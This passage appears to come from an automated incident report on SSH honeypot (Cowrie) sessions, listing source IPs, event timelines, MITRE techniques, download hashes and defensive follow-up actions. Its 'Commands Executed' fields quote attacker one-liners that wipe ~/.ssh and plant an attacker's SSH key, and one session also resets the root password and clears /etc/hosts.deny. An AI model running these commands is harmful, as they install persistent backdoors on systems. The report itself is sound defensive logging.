| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 10:02:15` | `cowrie.session.connect` |
| `2026-06-07 10:02:15` | `cowrie.client.version` |
| `2026-06-07 10:02:16` | `cowrie.client.kex` |
| `2026-06-07 10:02:17` | `cowrie.login.success` |
| `2026-06-07 10:02:17` | `cowrie.session.params` |
| `2026-06-07 10:02:17` | `cowrie.command.input` |
| `2026-06-07 10:02:17` | `cowrie.command.failed` |
| `2026-06-07 10:02:17` | `cowrie.log.closed` |
| `2026-06-07 10:02:18` | `cowrie.session.params` |
| `2026-06-07 10:02:18` | `cowrie.command.input` |
| `2026-06-07 10:02:18` | `cowrie.session.file_download` |
| `2026-06-07 10:02:18` | `cowrie.log.closed` |
| `2026-06-07 10:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fdce294c2ed

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-07 10:02 |
| **Last Seen** | 2026-06-07 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 10:02:23` | `cowrie.session.connect` |
| `2026-06-07 10:02:23` | `cowrie.client.version` |
| `2026-06-07 10:02:23` | `cowrie.client.kex` |
| `2026-06-07 10:02:24` | `cowrie.login.success` |
| `2026-06-07 10:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e0ae13dbb0

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-07 10:06 |
| **Last Seen** | 2026-06-07 10:07 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:7Iz1S7o9YNLx"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 10:06:52` | `cowrie.session.connect` |
| `2026-06-07 10:06:52` | `cowrie.client.version` |
| `2026-06-07 10:06:53` | `cowrie.client.kex` |
| `2026-06-07 10:06:54` | `cowrie.login.success` |
| `2026-06-07 10:06:56` | `cowrie.session.params` |
| `2026-06-07 10:06:56` | `cowrie.command.input` |
| `2026-06-07 10:06:56` | `cowrie.command.failed` |
| `2026-06-07 10:06:56` | `cowrie.log.closed` |
| `2026-06-07 10:06:57` | `cowrie.session.params` |
| `2026-06-07 10:06:57` | `cowrie.command.input` |
| `2026-06-07 10:06:57` | `cowrie.session.file_download` |
| `2026-06-07 10:06:57` | `cowrie.log.closed` |
| `2026-06-07 10:07:16` | `cowrie.session.params` |
| `2026-06-07 10:07:16` | `cowrie.command.input` |
| `2026-06-07 10:07:16` | `cowrie.log.closed` |
| `2026-06-07 10:07:17` | `cowrie.session.params` |
| `2026-06-07 10:07:17` | `cowrie.command.input` |
| `2026-06-07 10:07:17` | `cowrie.log.closed` |
| `2026-06-07 10:07:17` | `cowrie.session.params` |
| `2026-06-07 10:07:17` | `cowrie.command.input` |
| `2026-06-07 10:07:18` | `cowrie.session.file_download` |
| `2026-06-07 10:07:18` | `cowrie.log.closed` |
| `2026-06-07 10:07:18` | `cowrie.session.params` |
| `2026-06-07 10:07:18` | `cowrie.command.input` |
| `2026-06-07 10:07:18` | `cowrie.log.closed` |
| `2026-06-07 10:07:19` | `cowrie.session.params` |
| `2026-06-07 10:07:19` | `cowrie.command.input` |
| `2026-06-07 10:07:19` | `cowrie.log.closed` |
| `2026-06-07 10:07:19` | `cowrie.session.params` |
| `2026-06-07 10:07:19` | `cowrie.command.input` |
| `2026-06-07 10:07:19` | `cowrie.command.input` |
| `2026-06-07 10:07:20` | `cowrie.log.closed` |
| `2026-06-07 10:07:20` | `cowrie.session.params` |
| `2026-06-07 10:07:20` | `cowrie.command.input` |
| `2026-06-07 10:07:21` | `cowrie.log.closed` |
| `2026-06-07 10:07:21` | `cowrie.session.params` |
| `2026-06-07 10:07:21` | `cowrie.command.input` |
| `2026-06-07 10:07:22` | `cowrie.log.closed` |
| `2026-06-07 10:07:23` | `cowrie.session.params` |
| `2026-06-07 10:07:23` | `cowrie.command.input` |
| `2026-06-07 10:07:23` | `cowrie.log.closed` |
| `2026-06-07 10:07:23` | `cowrie.session.params` |
| `2026-06-07 10:07:23` | `cowrie.command.input` |
| `2026-06-07 10:07:24` | `cowrie.log.closed` |
| `2026-06-07 10:07:24` | `cowrie.session.params` |
| `2026-06-07 10:07:24` | `cowrie.command.input` |
| `2026-06-07 10:07:25` | `cowrie.log.closed` |
| `2026-06-07 10:07:25` | `cowrie.session.params` |
| `2026-06-07 10:07:25` | `cowrie.command.input` |
| `2026-06-07 10:07:26` | `cowrie.log.closed` |
| `2026-06-07 10:07:26` | `cowrie.session.params` |
| `2026-06-07 10:07:26` | `cowrie.command.input` |
| `2026-06-07 10:07:27` | `cowrie.log.closed` |
| `2026-06-07 10:07:27` | `cowrie.session.params` |
| `2026-06-07 10:07:27` | `cowrie.command.input` |
| `2026-06-07 10:07:27` | `cowrie.log.closed` |
| `2026-06-07 10:07:28` | `cowrie.session.params` |
| `2026-06-07 10:07:28` | `cowrie.command.input` |
| `2026-06-07 10:07:28` | `cowrie.log.closed` |
| `2026-06-07 10:07:28` | `cowrie.session.params` |
| `2026-06-07 10:07:28` | `cowrie.command.input` |
| `2026-06-07 10:07:29` | `cowrie.log.closed` |
| `2026-06-07 10:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9830784969d2

| Field | Detail |
|---|---|
| **Source IP** | `187.33.59[.]116` |
| **First Seen** | 2026-06-07 10:30 |
| **Last Seen** | 2026-06-07 10:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 10:30:35` | `cowrie.session.connect` |
| `2026-06-07 10:30:35` | `cowrie.client.version` |
| `2026-06-07 10:30:36` | `cowrie.client.kex` |
| `2026-06-07 10:30:37` | `cowrie.login.success` |
| `2026-06-07 10:30:38` | `cowrie.session.params` |
| `2026-06-07 10:30:38` | `cowrie.command.input` |
| `2026-06-07 10:30:38` | `cowrie.command.failed` |
| `2026-06-07 10:30:38` | `cowrie.log.closed` |
| `2026-06-07 10:30:38` | `cowrie.session.params` |
| `2026-06-07 10:30:38` | `cowrie.command.input` |
| `2026-06-07 10:30:39` | `cowrie.session.file_download` |
| `2026-06-07 10:30:39` | `cowrie.log.closed` |
| `2026-06-07 10:30:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.59[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.33.59[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-152f2675edcc

| Field | Detail |
|---|---|
| **Source IP** | `187.33.59[.]116` |
| **First Seen** | 2026-06-07 10:30 |
| **Last Seen** | 2026-06-07 10:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 10:30:42` | `cowrie.session.connect` |
| `2026-06-07 10:30:42` | `cowrie.client.version` |
| `2026-06-07 10:30:43` | `cowrie.client.kex` |
| `2026-06-07 10:30:44` | `cowrie.login.success` |
| `2026-06-07 10:30:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.33.59[.]116` to AbuseIPDB if not already reported
- [ ] Block `187.33.59[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8395b26117e1

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-07 10:45 |
| **Last Seen** | 2026-06-07 10:45 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 10:45:10` | `cowrie.session.connect` |
| `2026-06-07 10:45:10` | `cowrie.client.version` |
| `2026-06-07 10:45:11` | `cowrie.client.kex` |
| `2026-06-07 10:45:13` | `cowrie.login.success` |
| `2026-06-07 10:45:14` | `cowrie.session.params` |
| `2026-06-07 10:45:14` | `cowrie.command.input` |
| `2026-06-07 10:45:14` | `cowrie.command.failed` |
| `2026-06-07 10:45:14` | `cowrie.log.closed` |
| `2026-06-07 10:45:15` | `cowrie.session.params` |
| `2026-06-07 10:45:15` | `cowrie.command.input` |
| `2026-06-07 10:45:17` | `cowrie.session.file_download` |
| `2026-06-07 10:45:17` | `cowrie.log.closed` |
| `2026-06-07 10:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62026e8c3104

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-07 10:45 |
| **Last Seen** | 2026-06-07 10:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 10:45:25` | `cowrie.session.connect` |
| `2026-06-07 10:45:25` | `cowrie.client.version` |
| `2026-06-07 10:45:26` | `cowrie.client.kex` |
| `2026-06-07 10:45:27` | `cowrie.login.success` |
| `2026-06-07 10:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91ad7111b377

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-07 10:55 |
| **Last Seen** | 2026-06-07 10:55 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 10:55:08` | `cowrie.session.connect` |
| `2026-06-07 10:55:08` | `cowrie.client.version` |
| `2026-06-07 10:55:10` | `cowrie.client.kex` |
| `2026-06-07 10:55:13` | `cowrie.login.success` |
| `2026-06-07 10:55:13` | `cowrie.session.params` |
| `2026-06-07 10:55:13` | `cowrie.command.input` |
| `2026-06-07 10:55:13` | `cowrie.command.failed` |
| `2026-06-07 10:55:16` | `cowrie.log.closed` |
| `2026-06-07 10:55:16` | `cowrie.session.params` |
| `2026-06-07 10:55:16` | `cowrie.command.input` |
| `2026-06-07 10:55:17` | `cowrie.session.file_download` |
| `2026-06-07 10:55:17` | `cowrie.log.closed` |
| `2026-06-07 10:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2f51f21fd1f

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-07 10:55 |
| **Last Seen** | 2026-06-07 10:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 10:55:29` | `cowrie.session.connect` |
| `2026-06-07 10:55:30` | `cowrie.client.version` |
| `2026-06-07 10:55:31` | `cowrie.client.kex` |
| `2026-06-07 10:55:34` | `cowrie.login.success` |
| `2026-06-07 10:55:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a2eeffbec3b

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-07 11:00 |
| **Last Seen** | 2026-06-07 11:01 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:00:28` | `cowrie.session.connect` |
| `2026-06-07 11:00:28` | `cowrie.client.version` |
| `2026-06-07 11:00:28` | `cowrie.client.kex` |
| `2026-06-07 11:00:39` | `cowrie.login.success` |
| `2026-06-07 11:00:45` | `cowrie.session.params` |
| `2026-06-07 11:00:45` | `cowrie.command.input` |
| `2026-06-07 11:00:45` | `cowrie.command.failed` |
| `2026-06-07 11:00:46` | `cowrie.log.closed` |
| `2026-06-07 11:00:46` | `cowrie.session.params` |
| `2026-06-07 11:00:46` | `cowrie.command.input` |
| `2026-06-07 11:00:49` | `cowrie.session.file_download` |
| `2026-06-07 11:00:49` | `cowrie.log.closed` |
| `2026-06-07 11:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14ae9d0a48fe

| Field | Detail |
|---|---|
| **Source IP** | `172.190.51[.]254` |
| **First Seen** | 2026-06-07 11:00 |
| **Last Seen** | 2026-06-07 11:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:00:58` | `cowrie.session.connect` |
| `2026-06-07 11:00:58` | `cowrie.client.version` |
| `2026-06-07 11:00:59` | `cowrie.client.kex` |
| `2026-06-07 11:01:03` | `cowrie.login.success` |
| `2026-06-07 11:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.190.51[.]254` to AbuseIPDB if not already reported
- [ ] Block `172.190.51[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd2525e5e5d3

| Field | Detail |
|---|---|
| **Source IP** | `45.10.175[.]77` |
| **First Seen** | 2026-06-07 11:32 |
| **Last Seen** | 2026-06-07 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:32:22` | `cowrie.session.connect` |
| `2026-06-07 11:32:22` | `cowrie.client.version` |
| `2026-06-07 11:32:22` | `cowrie.client.kex` |
| `2026-06-07 11:32:22` | `cowrie.login.success` |
| `2026-06-07 11:32:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.10.175[.]77` to AbuseIPDB if not already reported
- [ ] Block `45.10.175[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c8c876977c8

| Field | Detail |
|---|---|
| **Source IP** | `47.121.184[.]138` |
| **First Seen** | 2026-06-07 11:33 |
| **Last Seen** | 2026-06-07 11:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:33:22` | `cowrie.session.connect` |
| `2026-06-07 11:33:22` | `cowrie.client.version` |
| `2026-06-07 11:33:22` | `cowrie.client.kex` |
| `2026-06-07 11:33:23` | `cowrie.login.success` |
| `2026-06-07 11:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.121.184[.]138` to AbuseIPDB if not already reported
- [ ] Block `47.121.184[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d5c3d47c866

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-06-07 11:36 |
| **Last Seen** | 2026-06-07 11:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:36:56` | `cowrie.session.connect` |
| `2026-06-07 11:36:56` | `cowrie.client.version` |
| `2026-06-07 11:36:56` | `cowrie.client.kex` |
| `2026-06-07 11:36:56` | `cowrie.login.success` |
| `2026-06-07 11:36:57` | `cowrie.session.params` |
| `2026-06-07 11:36:57` | `cowrie.command.input` |
| `2026-06-07 11:36:57` | `cowrie.command.failed` |
| `2026-06-07 11:36:57` | `cowrie.log.closed` |
| `2026-06-07 11:36:57` | `cowrie.session.params` |
| `2026-06-07 11:36:57` | `cowrie.command.input` |
| `2026-06-07 11:36:57` | `cowrie.session.file_download` |
| `2026-06-07 11:36:57` | `cowrie.log.closed` |
| `2026-06-07 11:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c170ede54df9

| Field | Detail |
|---|---|
| **Source IP** | `165.154.1[.]18` |
| **First Seen** | 2026-06-07 11:36 |
| **Last Seen** | 2026-06-07 11:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 11:36:59` | `cowrie.session.connect` |
| `2026-06-07 11:36:59` | `cowrie.client.version` |
| `2026-06-07 11:36:59` | `cowrie.client.kex` |
| `2026-06-07 11:36:59` | `cowrie.login.success` |
| `2026-06-07 11:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.1[.]18` to AbuseIPDB if not already reported
- [ ] Block `165.154.1[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92a3ae5c4519

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 11:38 |
| **Last Seen** | 2026-06-07 11:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
